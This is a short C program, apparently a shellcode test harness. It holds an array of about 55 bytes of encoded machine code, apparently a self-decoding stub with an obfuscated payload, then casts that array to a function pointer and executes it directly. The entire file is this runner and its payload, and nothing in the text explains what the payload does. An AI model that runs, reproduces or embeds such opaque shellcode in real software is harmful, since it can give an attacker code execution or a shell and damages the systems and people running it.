#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xfc\xbb\x78\xe7\x6f\xc6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x49\x27\x3f\xae\x86"
"\x88\xb3\x46\xb0\xf9\x51\xfe\x2e\x8f\x75\x50\x27\x6d\x2a\xd8"
"\xd6\xc2\xc6\x17\x98\x23\xd9\xa7\x98\x23\xd9\xa7";

main()
{

    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}